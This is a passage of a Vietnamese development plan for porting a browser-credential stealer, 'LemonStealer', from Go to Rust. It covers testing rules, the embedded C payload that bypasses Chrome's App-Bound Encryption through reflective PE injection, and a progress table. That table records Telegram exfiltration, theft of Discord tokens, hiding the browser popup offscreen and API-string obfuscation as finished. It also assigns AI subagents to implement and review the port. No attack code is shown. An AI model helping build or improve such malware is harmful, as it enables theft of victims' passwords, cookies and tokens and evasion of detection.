- **Port TOÀN BỘ test Go, 0 test bị bỏ/xoá** (lesson Bun: "0 tests skipped or deleted") — test nào không port được phải note lý do rõ ràng.
- Golden output: fixture JSON/CSV snapshot.
- Parity test tự động (nếu build được cả 2): script `scripts/parity.ps1` chạy 2 binary trên profile mẫu, `diff -r`/`fc`.

### R6. Dependencies & unsafe
- Ưu tiên crate chính thống, pin version; ghi lý do chọn crate vào code nếu không hiển nhiên.
- Không dùng `unsafe` vô cớ; mọi `unsafe` phải có `// SAFETY:` comment giải thích invariant.
- Tránh crate chết/ít bảo trì — ưu tiên tự viết module nhỏ.

### R7. Commit & tiến độ
- 1 phase = chuỗi commit nhỏ (feat per extractor), mỗi commit build + test pass.
- Không commit thay đổi Go repo gốc. Không copy file binary/fixture lớn vào git nếu >5MB (dùng git-lfs hoặc sinh fixture bằng script).
- **Cargo check làm work queue** (lesson Bun): sau khi port 1 crate → `cargo check` → sửa lỗi compiler theo nhóm file, xong mới qua crate kế.

### R8. CLI parity
- Flag names/shorts/aliases giữ nguyên (`-b, -c, -f, -d, -p, --zip, -v`); **bỏ `--keychain-pw`**; `--help` text tương đương; `dump` vẫn là default command khi không có subcommand.

### R9. Payload C (ABE) — KHÔNG port sang Rust
- `abe_extractor.c` + `bootstrap.c` + `com_iid.c` + `bootstrap_layout.h` giữ nguyên 100% (chỉ sửa nếu Go repo sửa).
- Build bằng `build.rs` gọi `zig cc` (hoặc `clang`/`x86_64-w64-mingw32-gcc` — theo `Makefile.frag` hiện có), output `abe_extractor_amd64.bin`, embed qua `include_bytes!`; module Rust chỉ là wrapper đọc/sửa bytes + layout constants từ `bootstrap_layout.h`.
- Thêm test assert offset layout trùng khớp giữa hằng số Rust và `bootstrap_layout.h`.

### R10. Adversarial review (lesson Bun)
- Mỗi phase port xong 1 file/1 nhóm: agent **implementer** viết, ít nhất 1 agent **reviewer** (context riêng) chỉ tìm bug — reviewer không được nhìn code implementer tự review bản thân.
- Reviewer checklist: lệch behavior với Go (so file Go vs file Rust), vi phạm PORTING.md/RULES, thiếu test, unsafe thiếu SAFETY, workaround dài dòng.
- **Reject workaround "stub kèm comment giải thích dài"** (lesson Bun: "If you need a paragraph-long comment to justify why the workaround is OK, the code is wrong — fix the code").
- Quy mô: project nhỏ (~10k LOC) → không cần 64 agents như Bun; dùng 2-3 subagent song song mỗi phase.

## 5. Rủi ro & mitigation (Windows-only)

| Rủi ro | Độ khó | Mitigation |
|---|---|---|
| **ABE v20 (reflective PE injection + payload encryption)** | Cao nhất | ✅ XONG — isolate unsafe trong `abi`; verify thật trên Chrome 151 (`docs/VERIFY.md`). APPB-prefix bug đã sửa; popup browser được đẩy offscreen |
| **copyLocked (file bị khoá độc quyền)** | Cao | CHƯA PORT — `session::copy_locked_stub` trả lỗi; NtQuerySystemInformation + DuplicateHandle + FileMapping defer để tránh unsafe. Cookie bị khoá vẫn bị bỏ qua |
| **LevelDB reader (Chromium storage)** | Trung bình | ✅ tự viết log+table, Snappy (`snap`); test leveldb fixture + rust-card WAL/single-file |
| `reflect`-based output parity | Trung bình | ✅ snapshot JSON/CSV đúng thứ tự field (Rust struct order = Go). Chưa golden-diff với Go binary |
| Chromium v12 (SecretPortal) | Thấp | Linux-only → không cần implement; giữ error "unsupported" giống Go |
| Glob profile `*` (Arc/DuckDuckGo) | Thấp | crate `glob`, port logic `resolve_globs` |
| DPAPI entropy/scope khác phiên bản | Thấp | Dùng đúng flags `CRYPTPROTECT_UI_FORBIDDEN`; test round-trip. Lưu ý Chrome 151: key v10 trong Local State là dummy (ABE) |

## 6. Ước lượng & thứ tự làm

```
Phase 0-1 (core + crypto)   → nền móng ✅ (committed)
Phase 2 (chromium extract)  → toàn bộ browsers Windows ✅
Phase 2b (session/zip)      → ✅ (còn copyLocked: chưa port)
Phase 3 (DPAPI keyring)     → ✅
Phase 4 (output + CLI)      → MVP dùng được: dump/dumpkeys/list/version ✅ (archive/restore + double-click: TODO)
Phase 5 (ABE v20)           → ✅ verify thật trên Chrome 151
Phase 6 (parity + còn lại)  → hardening ✅; archive/restore/double-click + parity diff + port test còn thiếu
Wave 7 (Telegram exfil)     → ✅ (feature mới, ngoài Go)
Wave 8 (Discord steal)      → ✅ (app LevelDB + web localStorage, ngoài Go)
Perf: parallel browsers     → ✅ (std::thread::scope — mỗi browser 1 thread, output deterministic theo thứ tự)
Perf: Telegram upload       → ✅ (zip sendDocument chạy thread riêng song song với probe/screenshot/photo)
Obfuscation: chuỗi API      → ✅ (IAT sạch std+CRT; export names qua resolve!/xs!; error-string API-name về 0)
Binary rename               → ✅ (LemonStealer.exe → lemon.exe)
```

Checkpoint "MVP dùng được": `LemonStealer dump -b chrome -c all -f json` output
khớp Go binary trên Windows cho profile pre-127. Sau Phase 5: khớp cả Chrome 127+ (v20) — verified trên Chrome 151.